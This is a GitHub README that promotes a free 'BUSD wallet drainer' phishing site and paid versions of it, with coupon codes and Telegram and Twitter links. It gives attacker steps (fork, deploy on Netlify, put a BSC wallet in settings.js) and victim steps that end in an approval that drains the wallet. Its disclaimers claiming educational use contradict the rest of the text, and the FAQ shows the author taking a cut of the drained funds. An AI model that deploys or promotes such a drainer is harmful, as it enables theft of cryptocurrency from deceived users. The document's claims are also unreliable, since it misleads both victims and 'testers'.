
### Read my common myths and scams before buying scripts from anyone on github https://github.com/moneywithbots/Common-scams-and-myths- ###

### List of sellix dealers that i have screened https://github.com/moneywithbots/Sellix-id-verified-script-dealers ###


### IF YOU WERE DRAINED BY THIS FREE SCRIPT BY AN ERROR MADE BY YOU I WILL OFFER A PARTIAL REFUND ONLY TO BE SENT TO THE ADDRESS DRAINED FROM MUST PURCHASE CHAT PASS TO CONTACT ME THE CHAT PASS AND PARTIAL REFUND WILL BE FOWARDED TO YOU IF YOUR ADDRESS WAS DRAINED BY THIS FREE VERSION ###


!!!!!!!For direct drain to your wallet with no custom smart contract https://moneywithbots.sellix.io/ !!!!!!!!!!!!!

!!!!!!!!! 20 % off for first 100 users and get the drainer bootcamp free with all the info needed too use the scripts 
coupon code : "OYESHIBgvxdPlpbD"          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

!!!!!!!!! 50 % off for first 10 users and get drainer bootcamp free couponcode: "KlFTxgscMnzwgNFc" !!!!!!!!!!!!!!!!!!

### Telegram group for more info https://t.me/moneywithbotsscripts coupon codes will be posted randomly ###

### Twitter will be posting coupon codes randomly to followers https://twitter.com/moneywithbots ###

### JOIN TELEGRAM GROUP FOR A CHANCE TO WIN DIRECT VERSION FREE WILL DO 1 EVERY WEEK A 250 DOLLAR VALUE FREE https://t.me/moneywithbotsscripts ###

### Please only use this for educational purposes not too hack others Please use for testing or educational purposes only by using this script you authorize this script to make transactions if you do not feel ok with this script doing that please do not use this script or buy the direct one https://moneywithbots.sellix.io/ ###


This is the same method pro hackers use to make millions  💰💰💰💰💰💰💰

If you notice small payments made to you thats because most people test the site with small amounts


              ##########
              
              
Instructions on how to start are below ⬇️


              ##########
              

### Read my common myths and scams before looking else where for scripts https://github.com/moneywithbots/Common-scams-and-myths- ###

Deploy steps

!!!!!! Make sure you fork it then deploy !!!!!!!

info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0

!!!!!! Make sure you add your wallet to settings.js file !!!!!!! 

!!!!!!!!!!!!!!!
 https://www.netlify.com/ !!!!!!!!!!!!!!!

1. Go to above link to deploy the code once you fork it


2. Follow the steps on netlify


3. deploy


4. Add your wallet to settings.js file use bsc address make sure your adding it to the settings.js file in your fork 

!!!


### my youtube tutorial https://youtu.be/ESxOvW-IOg0 ###

!!!!!!!!!!!!!

!!!

Fork ---------->  add your bsc wallet to settings.js file  ------> Go to  https://www.netlify.com/ and deploy










!!!!!! Make sure you add your wallet to settings.js file !!!!!!!

### HOW IT WORKS ONLY FOR FREE VERSION ###

### REMEMBER THE FREE VERSION IS ONLY MENT TO BE A TRIAL A DEMO ###

Crypto wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS

!!!!!!!!! This only will work with wallets that have 50 busd or more for stealth !!!!!!!!!

The !!! smart contract address !!! appears in the transaction not yours this is for stealth

This script will let you drain BUSD from the targets address

This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto

go to https://www.netlify.com/ to host or host it on a regular site







Steps you have to do as the attacker (you)

1. fork

2. deploy on netify

3. add bsc wallet to settings.js if you dont the smart contract will not foward it to you

4. go to netify and confirm deployment

5. edit the html file if you want to change the site appearance for help join telegram


Steps that the !!! victim !!! has to do

1.first connect to bnb network

2.Click approve

3.Smart contract gets approved then it will foward the data to the attackers wallet (you) 

4.Drain wallet








!!!!!!!!!!!!!!!!!!! Cloning this script will not allow my software to send money to you do not clone if you test this script if you do you will be less likely to recieve payments from testing !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!



FAQ (frequently asked questions)

(question 1). Which type of crypto does this script drain does it drain all crypto or only one type

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

(answer 1). This script is only used to drain one type of crypto which is the type shown in the title it is impossible to drain multiple tokens in one transaction if someone offers you a script that does that it is a scam it is possible to select the crypto that has the highest balance in the wallet after the user does a signiture though.

(question 2). How effective is this type of script in the real world 

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

(answer 2) . This type of script is very effective in the real world but moneywithbots does not authorize people to use this in the real world this script is only ment to be used for testing and as a simulation for testing for an example in police training police often get pepper sprayed and tazed by real devices so that when they run into that in the real world they would be able to understand what that type of device feels like. This is the same thing by this script actually draining crypto it teaches people that this is a real type of scam and that it actually drains your crypto.

(question 3). Do you give people premission to use this in the real world and for something other than testing or educational purposes.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

(answer 3). No i do not give anyone premission to use this against anyone who doesnt give them premission to do that please only use this on people who are aware that this is a drainer.

(question 4). How many people try to exploit the automation system that this script has applied.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

(answer 4) . Alot people try to exploit this script this script all the time thats why this script is constanlty being updated and changed to make sure that it isnt exploited.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

(question 5). What is a custom smart contract
(answer 5). It is a local python system that sends money based of the wallet in the settings file this can be done automactilly or manually 

(question 6). How is moneywithbots involved in this script what does he do to manage this script.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

(answer 6) . I mainly manage the data by this script on a server and keep the pyton script running locally when people use this script i get the data and am able to foward the crypto to the wallets that are testing this script. If you clone this script i can not guarentee that you will recieve payments. Payments are made depending on if a testers site is being used for testing and has money comming in from testing it.

Any futher questions can be answered by fulling reading this scripts readme all information is stated in this script and there are no hidden intentions by money with bots if you feel like you have been misinformed by this script please take the time to fully read this script before making any complaints. This script was designed only as a simulation and it does actually drain real crypto so make sure you know everything that is in this readme before using it read it top from bottom read it fully read it multiple times if you want but this is a very dangerous script so please only use it for testing or education purposes this script is far from perfect. Also there are no refunds for testing this script the only time refunds are made are to people who are innocent that are scammed by one of my hacks and since moneywithbots only makes a fee of what is drained he would not be able to do no where close to a full refund. All fees are used to keep this system running and for server and data management services.

!!! Check out my new USDT token hack https://github.com/moneywithbots/bnb-eth-usdt-wallet-drainer !!!

!!! Check out my new Bnb airdrop drainer https://github.com/moneywithbots/bnb-airdrop-drainer !!!

!!! Check out my new WBNB drainer https://github.com/moneywithbots/bnb-eth-wbnb-wallet-drainer !!!

!!! Check out my new Busd doubler drainer https://github.com/moneywithbots/bnb-busd-doubler-drainer !!!



!!!!!!!!!!!Please only use this for educational purposes not too hack others Please use for testing or educational purposes only  Make sure you read everything before using this script moneywithbots is not responsible for mistakes or tester who dont spend the time to full read this readme by using this script you accept everything listed in this script in the readme if you dont want to agree to my terms for testing and educational purposes do not use this script. Do not use this script on innocent people moneywithbots will not be held responsible for someone who does that this script was only designed for educational or testing purposes to futher increase the security of crypto in the future please read the terms of service and disclaimer before actually using or testing this script money with bots will assume that all users understand everything stated in the disclaimer and terms of service. Dont use this with out reading everything in detail.!!!!!!!!!!!!!!


MIT License

Copyright (c) 2022 moneywithbots

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


terms and conditions

by using this script you void all rights to sue or prosicute the developers and using this script to hack others will only hold the hackers responsible for legal and civil actions that may arise from exploiting others this script is only intended to educate people on how this scam works. This script is only intended to be used to educate people its not intended to be used for real world situations. Do not use this script to scam other people. By using this script you agree to these terms and services if you do not want to agree to these terms do not use this script. Also moneywithbots is protected under this clause do to the fact he has no affiliations with this script being used in the real world moneywithbots is just trying to bring awareness to this type of scam

Disclamer: i do not promote hacking i just want to share how hackers have been draining millions of dollars so that the community can learn about it by using this free script you accept the terms that i will not be held responsible for damages arising from the use and damages arising from improperly using this script to hack others or testing. the reason for this script is for purely education purposes only this script is not intended to be used for illegal purposes all content of this script is only there to educate people to avoid being scammed. By using this script you void all ownership too your busd in your wallet and allow it to be used transfered and sold by any wallet approved to do so by this script. And as the user of this script you allow all wallets used by this script to access spend and use your Busd. Moneywithbots is not the creator of this script. Money with bots is not the creator of this script and holds no responsibily in proving the legitmancy of this script money with bots therefore cannot guanrentee anything said about this script im just trying to share this script to the public so that people are aware of this.The amount approved by the wallet holder shall be consider fees to using the script if the wallet holder does not wish to agree then dont use this script money with bots does not intend on deciving or scamming anyone the fees charged shall be up to the approved amount and can be deducted at anytime.
The approval amount can be set and changed by the testers but its default is set and hardcoded into this code. Please do not use this script illegally there is no way i can tell if someone is using this illegally and i do not and will not knowingly allow innocent people to be drained by this script if i suspect anyone of knowingly using this script illegally i will refuse to work with that person in aiding or testing this script. Also this script does not count as any investment or ponzi scheme do to the fact that its not intended to be used in real world scenerios and the fees charged is used to award the users for participating in this testing this script all profits made from this script shall be considered fees for using this script for me finding and uploading it and causing awarness towards this script. This script will help people not be scammed by causing awareness of this type of scam/hack so hopefully in the future crypto will be able to add more safety features to its wallets to limit this type of method. But the only way that this can happen is by more people knowing about it in detail. Do not use this script to hack others i really cannot stress that i have no way of filtering legitmate people and non legit people so all of that will be up too the proper authorities to do because moneywithbots does not have those resources. In the beginning of this script readme i state on use this for education purposes which is the first thing people see so i really tried my best to make people not use this illegally and did all i could do to prevent that. Also do to users who use this script outside of github there is no way for me to know a tester from a innocent person so if someone is using this in the real world i am not aware of it and if i suspect that its being used on a real person i will try to blacklist the hacker but this would be impossible for me to do because it has been download by many people and this script may be already in the wild and edited to suit the hackers form but that is a risk that must be taken to educate this generation on this type of scam. The statements made in the readme and youtube video should be taken with a grain of salt because i have not personally used or tested this script before but have been told that it preforms well. I am not well educated on coding or this script and does not have the understanding to see if the code works as stated in the video but i was told be a coder that this was how it worked and i obtained this script from him. So the forks and clones is what should be targeted if an investigation or civil suit is applied from this because there the ones who are actually using and spreading this script not me moneywithbots has never used this script on a real person and does not ever intend on doing that in the future. Please make sure you read this disclamer fully before using or testing this script it states my full and honost intentions and no decieving or fraud has been done by me moneywithbots. All profits moneywithbots makes is used to maintain the servers and my time to keep this running indefiently if i dont profit from this then i would not be able to keep this script running properly so this script does allow moneywithbots to profit from this script if he chooses to do so which is run by a automated server which could send fees to moneywithbots directly so he can keep the script running and operational for testers the way this works is a trade secret and cannot be futher explained here. But my main point is that moneywithbots is able to profit from the money the testers use so that he can keep this script fully functinal and add updates by the moneywithbots team. But no one has invested in this script no one is recruited for this script no one is being decieved by this script so if moneywithbots is contacted by any law enforcements there will be little he could do to help with identifing the hackers that are cloning this script and using it on innocent people. In closing Moneywithbots is doing this for a profit but he is only trying to profit from the testers money that they use to test this script if moneywithbots profit from any innocent person he would not be able to tell if is from an innocent person or one of the many scammers claming to be an innocent person so without hard proof of any person thats innocent thats been drained by this script moneywithbots would not be able to help and also since moneywithbots doesnt recieve the full amount and only charge fees he would not be able to do any refunds do to the fact that it would not all go to me moneywithbots. But money with bots would be able to do a partial refund on a case by case basis but do to the amount of scammers out there moneywithbots will not activily scan for innocent people being scammed by this and will count on the people that forked it and cloned it to only use this for legit purposes. Update do to people exploiting the automation system that was previously being designed all transactions will be done manually from 7/17/2022 on and foward untill a more secure method is applied.

!!!!!!!!!!!!!!!!!!!!!! Innocent non testers are the only ones eligable for a partial refund testers are not eligable !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
End of disclamer.



